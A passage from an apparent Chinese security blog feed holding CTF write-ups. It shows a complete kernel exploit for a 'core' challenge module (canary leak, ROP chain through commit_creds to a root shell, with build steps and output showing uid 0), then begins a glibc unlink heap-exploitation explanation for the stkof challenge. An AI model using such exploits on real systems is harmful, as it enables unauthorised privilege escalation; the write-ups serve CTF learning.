        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">save_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">asm</span><span class="token punctuation">(</span>
    <span class="token string">"movq %%cs, %0\n"</span>
    <span class="token string">"movq %%ss, %1\n"</span>
    <span class="token string">"pushfq\n"</span>
    <span class="token string">"popq %2\n"</span>
    <span class="token punctuation">:</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> fd  <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/core"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"open core error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} fd: %d\n"</span><span class="token punctuation">,</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">save_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">find_symbols</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400000</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} set off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889C</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} copy to user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889b</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> canary <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> offset <span class="token operator">=</span> vmlinux_base <span class="token operator">-</span> raw_vmlinux_base<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} canary: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>canary<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} leak offset: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> rop_buf<span class="token punctuation">[</span><span class="token number">0x1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span> rop <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>rop_buf<span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> canary<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//rbx</span>
    <span class="token comment" spellcheck="true">//ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81000b2f</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//pop rdi ; ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8109cce0</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//prepare_kernel_cred</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff810a0f49</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//pop rdx ; ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8109c8e0</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//commit_creds</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8101aa6a</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//mov rdi, rax ; call rdx</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81a012da</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//swapgs ; popfq ; ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81050ac2</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//iretq</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>shell<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_cs<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_rflags<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span>


    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} copy from user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>rop_buf<span class="token punctuation">,</span><span class="token number">0x800</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} lets rop"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889a</span><span class="token punctuation">,</span><span class="token number">0xffffffffffff0000</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>use gcc make it </p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gcc -g exp.c -o exp
</code></pre>
<p>将编译好的exp放入解包后德tmp目录里 并且重新打包</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  core <span class="token function">ls</span>
bin       core.id2  core.til     init   linuxrc  sbin  usr
core.id0  core.ko   etc          lib    proc     sys   vmlinux
core.id1  core.nam  gen_cpio.sh  lib64  root     tmp
➜  core ./gen_cpio.sh core.cpio
<span class="token keyword">.</span>
./vmlinux
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
./lib64
./lib64/libm.so.6
./lib64/ld-linux-x86-64.so.2
./lib64/libc.so.6
./sys
125600 块

➜  core <span class="token function">mv</span> core.cpio <span class="token punctuation">..</span>/
</code></pre>
<p>运行exp 成功提权</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  core <span class="token function">cd</span> <span class="token punctuation">..</span>
➜  give_to_player ./start.sh 
qemu-system-x86_64: warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx <span class="token punctuation">[</span>bit 5<span class="token punctuation">]</span>
<span class="token punctuation">[</span>    0.026145<span class="token punctuation">]</span> Spectre V2 <span class="token keyword">:</span> Spectre mitigation: LFENCE not serializing, switching to generic retpoline
udhcpc: started, v1.26.2
udhcpc: sending discover
udhcpc: sending <span class="token keyword">select</span> <span class="token keyword">for</span> 10.0.2.15
udhcpc: lease of 10.0.2.15 obtained, lease <span class="token function">time</span> 86400
/ $ 
/$ <span class="token function">id</span>
uid<span class="token operator">=</span>1000<span class="token punctuation">(</span>chal<span class="token punctuation">)</span> gid<span class="token operator">=</span>1000<span class="token punctuation">(</span>chal<span class="token punctuation">)</span> groups<span class="token operator">=</span>1000<span class="token punctuation">(</span>chal<span class="token punctuation">)</span>
/$ <span class="token function">cd</span> tmp
/$ ./exp
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> fd: 3
commit_creds addr: 0xffffffff9869c8e0
vmlinux_base addr: 0xffffffff98600000
prepare_kernel_cred addr: 0xffffffff9869cce0
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> <span class="token keyword">set</span> off
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> ret: 0
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> copy to user
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> ret: 0
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> canary: 0x3b35ff2e9fa44700
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> leak offset: 0x17600000
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> copy from user
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> lets rop
/tmp <span class="token comment" spellcheck="true"># id</span>
uid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> gid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span>
</code></pre>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>还是有很多不懂得地方，边学习边记录 </p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;感谢CTF-wiki、P4nda、Veritas501  收获很大&lt;/p&gt;
&lt;p&gt;首先捋清kernel pwn 与 用户态下的pwn的区别&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;&quot; data-line_number=&quot;f
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>unlink-stkof</title>
    <link href="http://iosmosis.github.io/2018/11/16/unlink-stkof/"/>
    <id>http://iosmosis.github.io/2018/11/16/unlink-stkof/</id>
    <published>2018-11-16T14:23:53.000Z</published>
    <updated>2018-11-18T15:26:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>首先理解下unlink操作 </p>
<p>初始三个chunk大小都为0x80</p>
<table>
<thead>
<tr>
<th>chunk1</th>
<th></th>
<th>chunk2</th>
<th></th>
<th>chunk3</th>
</tr>
</thead>
<tbody>
<tr>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
</tr>
<tr>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x80</td>
</tr>
<tr>
<td>FD=next_PRE_size</td>
<td></td>
<td>FD=next_PRE_size</td>
<td></td>
<td>FD=0x0</td>
</tr>
<tr>
<td>BK=0x0</td>
<td></td>
<td>BK=before_PRE_size</td>
<td></td>
<td>BK=before_PRE_size</td>
</tr>
<tr>
<td>String</td>
<td></td>
<td>String</td>
<td></td>
<td>String</td>
</tr>
</tbody>
</table>
<p>接着进行unlink操作</p>
<p>令chunk1  FD =&gt; chunk3  PRE_size<br>令chunk3  BK =&gt; chunk1 PRE_size</p>
<table>
<thead>
<tr>
<th>chunk1</th>
<th></th>
<th>chunk2</th>
<th></th>
<th>chunk3</th>
</tr>
</thead>
<tbody>
<tr>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
</tr>
<tr>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x80</td>
</tr>
<tr>
<td>FD=next_next_PRE_size</td>
<td></td>
<td>FD=next_PRE_size</td>
<td></td>
<td>FD=0x0</td>
</tr>
<tr>
<td>BK=0x0</td>
<td></td>
<td>BK=before_PRE_size</td>
<td></td>
<td>BK=before_before_PRE_size</td>
</tr>
<tr>
<td>String</td>
<td></td>
<td>String</td>
<td></td>
<td>String</td>
</tr>
</tbody>
</table>
<p>执行unlink 后</p>
<table>
<thead>
<tr>
<th>chunk1</th>
<th></th>
<th>chunk3</th>
</tr>
</thead>
<tbody>
<tr>
<td>PRE_size</td>
<td>____</td>
<td>PRE_size</td>
</tr>
<tr>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x80</td>
</tr>
<tr>
<td>FD=next_PRE_size</td>
<td></td>
<td>FD=next_PRE_size</td>
<td></td>
<td>FD=0x0</td>
</tr>
<tr>
<td>BK=0x0</td>
<td></td>
<td>BK=before_PRE_size</td>
<td></td>
<td>BK=before_PRE_size</td>
</tr>
<tr>
<td>String</td>
<td></td>
<td>String</td>
<td></td>
<td>String</td>
</tr>
</tbody>
</table>
<h3 id="glibc中的保护机制（ubuntu18-04堆有做修改）"><a href="#glibc中的保护机制（ubuntu18-04堆有做修改）" class="headerlink" title="glibc中的保护机制（ubuntu18.04堆有做修改）"></a>glibc中的保护机制（ubuntu18.04堆有做修改）</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<pre class=" language-C"><code class="language-C">#由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))
      malloc_printerr ("corrupted size vs. prev_size");
<p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p>
</code></pre>
<p>既然要满足这个条件还要成功利用可以考虑伪造一个chunk从而绕过该检查<br>32位时</p>
<table>
<thead>
<tr>
<th>chunk1</th>
<th></th>
<th>fake chunk</th>
<th></th>
<th>chunk3</th>
</tr>
</thead>
<tbody>
<tr>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
</tr>
<tr>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x30</td>
<td></td>
<td>SIZE=0x80</td>
</tr>
<tr>
<td>FD=next_next_PRE_size</td>
<td></td>
<td>FD=ptr-0x12</td>
<td></td>
<td>FD=0x0</td>
</tr>
<tr>
<td>BK=0x0</td>
<td></td>
<td>BK=ptr-0x8</td>
<td></td>
<td>BK=before_before_PRE_size</td>
</tr>
<tr>
<td>String</td>
<td></td>
<td>String</td>
<td></td>
<td>String</td>
</tr>
</tbody>
</table>
<p>此时</p>
<pre class=" language-C"><code class="language-C">chunk1 FD = fake_chunk_PRE_size = ptr - 0x12
chunk3 BK = fake_chunk_PRE_size=ptr - 0x8
</code></pre>
<p>满足</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">FD<span class="token operator">-></span>bk <span class="token operator">=</span> P 
BK<span class="token operator">-></span>fd <span class="token operator">=</span> P
</code></pre>
<p>64位时</p>
<table>
<thead>
<tr>
<th>chunk1</th>
<th></th>
<th>fake chunk</th>
<th></th>
<th>chunk3</th>
</tr>
</thead>
<tbody>
<tr>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
</tr>
<tr>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x30</td>
<td></td>
<td>SIZE=0x80</td>
</tr>
<tr>
<td>FD=next_next_PRE_size</td>
<td></td>
<td>FD=ptr-0x18</td>
<td></td>
<td>FD=0x0</td>
</tr>
<tr>
<td>BK=0x0</td>
<td></td>
<td>BK=ptr-0x10</td>
<td></td>
<td>BK=before_before_PRE_size</td>
</tr>
<tr>
<td>String</td>
<td></td>
<td>String</td>
<td></td>
<td>String</td>
</tr>
</tbody>
</table>
<p>此时</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>chunk1 FD = fake_chunk_PRE_size = ptr - 0x18
chunk3 BK = fake_chunk_PRE_size=ptr - 0x10
</code></pre><p>满足</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>FD-&gt;bk = P 
BK-&gt;fd = P
</code></pre><h2 id="查看题目-stkof"><a href="#查看题目-stkof" class="headerlink" title="查看题目 stkof"></a>查看题目 stkof</h2><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">__int64 <span class="token function">sub_400C58</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    v0 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      v2 <span class="token operator">=</span> <span class="token function">edite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//creat chunk</span>
      <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        v2 <span class="token operator">=</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// free chunk</span>
        <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        v2 <span class="token operator">=</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//print </span>
        <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      v2 <span class="token operator">=</span> <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//creat chunk size</span>
      <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre>
<p>查看下每一个函数</p>
<h3 id="alloc"><a href="#alloc" class="headerlink" title="alloc"></a>alloc</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v1 <span class="token operator">=</span> <span class="token function">atoll</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
v2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//malloc size</span>
